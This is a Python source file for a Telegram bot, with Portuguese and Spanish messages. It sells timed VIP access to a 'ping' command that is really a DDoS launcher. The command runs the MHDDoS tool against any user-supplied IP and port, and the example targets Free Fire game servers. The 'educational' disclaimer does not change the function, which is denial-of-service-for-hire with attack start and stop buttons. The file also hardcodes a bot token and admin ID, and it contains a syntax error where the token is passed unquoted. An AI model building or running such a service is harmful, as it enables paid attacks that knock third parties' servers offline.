import telebot
import subprocess
import sqlite3
from datetime import datetime, timedelta
from threading import Lock
import time
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = "7987563641:AAGSipVdlKmcv4uokh8hUA6rVEVKE8pY8pY"
ADMIN_ID = 6348583777
START_PY_PATH = "MHDDoS/start.py"

bot = telebot.TeleBot(7987563641:AAGSipVdlKmcv4uokh8hUA6rVEVKE8pY8pY)
db_lock = Lock()
cooldowns = {}
active_attacks = {}

conn = sqlite3.connect("users.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute(
    """
    CREATE TABLE IF NOT EXISTS vip_users (
        id INTEGER PRIMARY KEY,
        telegram_id INTEGER UNIQUE,
        expiration_date TEXT
    )
    """
)
conn.commit()


@bot.message_handler(commands=["start"])
def handle_start(message):
    telegram_id = message.from_user.id

    with db_lock:
        cursor.execute(
            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
            (telegram_id,),
        )
        result = cursor.fetchone()


    if result:
        expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
        if datetime.now() > expiration_date:
            vip_status = "❌ *Seu plano VIP expirou.*"
        else:
            dias_restantes = (expiration_date - datetime.now()).days
            vip_status = (
                f"✅ VOCÊ É VIP!\n"
                f"⏳ Dias restantes: {dias_restantes} dia(s)\n"
                f"📅 Expira em: {expiration_date.strftime('%d/%m/%Y %H:%M:%S')}"
            )
    else:
        vip_status = "❌ *Você não possui um plano VIP ativo.*"
    markup = InlineKeyboardMarkup()
    button = InlineKeyboardButton(
        text="💻 SUPORTE - OFICIAL 💻",
        url=f"tg://user?id={6348583777}"

    )
    markup.add(button)
    
    bot.reply_to(
        message,
        (
            "🤖 *Bem-vindo ao Bot de Ping MHDDoS [Free Fire]!*"
            

            f"""
```
{vip_status}```\n"""
            "📌 *Como usar:*"
            """
```
/ping <TYPE> <IP/HOST:PORT> <THREADS> <MS>```\n"""
            "💡 *Ejemplo:*"
            """
```
/ping UDP 143.92.125.230:10013 10 900```\n"""
            "⚠️ *Atención:* Este bot fue creado para fines educacionales."
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )


@bot.message_handler(commands=["addvip"])
def handle_addvip(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "❌ Você não tem permissão para usar este comando.")
        return

    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(
            message,
            "❌ Formato inválido. Use: `/addvip <ID> <QUANTOS DIAS>`",
            parse_mode="Markdown",
        )
        return

    telegram_id = args[1]
    days = int(args[2])
    expiration_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")

    with db_lock:
        cursor.execute(
            """
            INSERT OR REPLACE INTO vip_users (telegram_id, expiration_date)
            VALUES (?, ?)
            """,
            (telegram_id, expiration_date),
        )
        conn.commit()

    bot.reply_to(message, f"✅ Usuário {telegram_id} adicionado como VIP por {days} dias.")


@bot.message_handler(commands=["ping"])
def handle_ping(message):
    telegram_id = message.from_user.id

    with db_lock:
        cursor.execute(
            "SELECT expiration_date FROM vip_users WHERE telegram_id = ?",
            (telegram_id,),
        )
        result = cursor.fetchone()

    if not result:
        bot.reply_to(message, "❌ Você não tem permissão para usar este comando.")
        return

    expiration_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S")
    if datetime.now() > expiration_date:
        bot.reply_to(message, "❌ Seu acesso VIP expirou.")
        return

    if telegram_id in cooldowns and time.time() - cooldowns[telegram_id] < 20:
        bot.reply_to(message, "❌ Aguarde 20 segundos antes de usar este comando novamente.")
        return

    args = message.text.split()
    if len(args) != 5 or ":" not in args[2]:
        bot.reply_to(
            message,
            (
                "❌ *Formato inválido!*\n\n"
                "📌 *Uso correto:*\n"
                "`/ping <TYPE> <IP/HOST:PORT> <THREADS> <MS>`\n\n"
                "💡 *Exemplo:*\n"
                "`/ping UDP 143.92.125.230:10013 10 900`"
            ),
            parse_mode="Markdown",
        )
        return

    attack_type = args[1]
    ip_port = args[2]
    threads = args[3]
    duration = args[4]
    command = ["python", START_PY_PATH, attack_type, ip_port, threads, duration]

    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    active_attacks[telegram_id] = process
    cooldowns[telegram_id] = time.time()

    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("⛔ Parar Ataque", callback_data=f"stop_{telegram_id}"))

    bot.reply_to(
        message,
        (
            "*[✅] ATAQUE INICIADO - 200 [✅]*\n\n"
            f"📍 *IP/Host:Porta:* {ip_port}\n"
            f"⚙️ *Tipo:* {attack_type}\n"
            f"🧵 *Threads:* {threads}\n"
            f"⏳ *Tempo (ms):* {duration}\n"
            f"💻 *Comando executado:* `ping`\n\n"
            f"*⚠️ Atenção! Este bot foi criado por* https://t.me/wsxteamorg"
        ),
        reply_markup=markup,
        parse_mode="Markdown",
    )


@bot.callback_query_handler(func=lambda call: call.data.startswith("stop_"))
def handle_stop_attack(call):
    telegram_id = int(call.data.split("_")[1])

    if call.from_user.id != telegram_id:
        bot.answer_callback_query(
            call.id, "❌ Apenas o usuário que iniciou o ataque pode pará-lo."
        )
        return

    if telegram_id in active_attacks:
        process = active_attacks[telegram_id]
        process.terminate()
        del active_attacks[telegram_id]

        bot.answer_callback_query(call.id, "✅ Ataque parado com sucesso.")
        bot.edit_message_text(
            "*[⛔] ATAQUE ENCERRADO [⛔]*",
            chat_id=call.message.chat.id,
            message_id=call.message.id,
            parse_mode="Markdown",
        )
        time.sleep(3)
        bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
    else:
        bot.answer_callback_query(call.id, "❌ Nenhum ataque ativo encontrado.")

if __name__ == "__main__":
    bot.infinity_polling()
